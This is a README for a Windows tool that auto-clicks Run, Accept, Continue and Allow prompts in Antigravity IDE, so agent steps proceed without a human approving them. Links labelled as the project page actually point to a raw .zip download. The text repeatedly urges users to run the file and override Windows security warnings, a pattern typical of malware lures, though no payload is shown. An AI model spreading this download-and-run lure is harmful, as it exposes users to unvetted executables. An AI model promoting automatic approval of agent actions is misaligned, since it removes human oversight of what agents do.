# ⚙️ antigravity-autopilot - Auto-accept Agent Steps on Windows

[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)

## 🚀 What this does

antigravity-autopilot helps Antigravity IDE move past agent prompts on Windows. It clicks Run, Accept, and Continue for you using Windows accessibility tools.

It does not need CDP. It does not need a browser hook. It works at the OS level, so it can help when other auto-accept tools fail.

## 📥 Download and install

Use this link to visit the project page and download the app:

[https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)

On the project page:

1. Open the latest release or download section.
2. Download the Windows file.
3. Open the file on your PC.
4. Follow the on-screen steps to run it.

If Windows shows a security prompt, choose the option to run the app.

## 🖥️ What you need

- Windows 10 or Windows 11
- Antigravity IDE installed
- A normal mouse and keyboard
- Permission to run desktop apps
- A screen that can show the Antigravity buttons

## ✨ What it can do

- Auto-click common agent buttons like Run, Accept, and Continue
- Use Windows UI Automation instead of CDP
- Work with desktop apps that expose standard controls
- Help with agent flows that stop for user approval
- Run in the background while you keep working

## 🧭 How to use it

1. Start Antigravity IDE.
2. Open your agent workflow.
3. Start antigravity-autopilot.
4. Let it watch for buttons like Run, Accept, and Continue.
5. When those buttons appear, it clicks them for you.

If the app has a simple toggle or start button, turn it on before you begin your agent task.

## 🛠️ Setup steps

### 1. Download the Windows file

Go to:

[https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)

Pick the latest Windows build from the release or download area.

### 2. Open the file

After the download finishes:

- Open the file from your Downloads folder
- If it is a `.exe` file, double-click it
- If Windows asks for permission, choose to allow it

### 3. Place it where you want

You can keep it in:

- Downloads
- Desktop
- A tools folder

If you want easy access, send it to your Desktop.

### 4. Run it with Antigravity IDE

- Open Antigravity IDE
- Start the agent task
- Start antigravity-autopilot
- Leave both windows open

## 🔍 How it works

This tool uses Windows UI Automation. That means it looks at the app like Windows does, not like a browser tool does.

It can find standard interface elements such as:

- Buttons
- Dialogs
- Confirmation boxes
- Agent action prompts

This lets it press the right control when Antigravity asks for approval.

## ✅ Best results

For the smoothest run:

- Keep Antigravity IDE visible
- Do not cover the app with many other windows
- Use the default Windows theme if you can
- Keep the display scale at a normal size
- Leave the agent window in the foreground when possible

## 🎯 Common use cases

- You keep getting prompts before each agent step
- Another auto-accept tool does not work in your setup
- You want a Windows-only method with no CDP setup
- You want the app to handle repeated approval clicks
- You use Antigravity IDE for agent work and want less manual clicking

## 📌 Example flow

A simple flow looks like this:

1. Open Antigravity IDE
2. Start an agent task
3. Launch antigravity-autopilot
4. The agent asks to Run or Continue
5. The tool clicks the button
6. The task moves to the next step

## 🧩 Compatibility

This tool is made for Windows desktop use. It fits well with apps that use common Windows controls and standard dialog boxes.

It is meant for:

- Windows users
- Antigravity IDE users
- Agent-mode workflows
- Desktop automation tasks

## 🧰 Troubleshooting

### The tool does not click anything

Try this:

- Make sure Antigravity IDE is open
- Bring the Antigravity window to the front
- Check that the prompt button is visible
- Restart the tool
- Try again from a clean app state

### The button text looks different

Some apps use different words for the same action. Look for buttons such as:

- Run
- Accept
- Continue
- Confirm
- Allow

### Windows blocks the app

If Windows shows a safety screen:

- Choose the option to run the file
- Check that you downloaded it from the project page
- Try opening it again after approval

### The app starts but does nothing

Try these steps:

- Close extra windows
- Keep the prompt on screen
- Make sure the app is not hidden behind another window
- Restart Antigravity IDE and the tool

## 🧪 Notes on behavior

The tool waits for common approval steps and tries to click them for you. It is best for repeat prompts that appear during agent work.

It is not built for games, web pages, or custom button styles that do not use normal Windows controls.

## 📂 Project info

- Repository: antigravity-autopilot
- Focus: auto-accept for Antigravity IDE
- Platform: Windows
- Method: Windows UI Automation
- Use case: agent steps, approvals, and continue prompts

## 🔗 Download again

Visit the project page here:

[https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)

## 🖱️ Quick start

1. Download the Windows file from the link above
2. Open it on your computer
3. Start Antigravity IDE
4. Start the tool
5. Let it handle the Run, Accept, and Continue clicks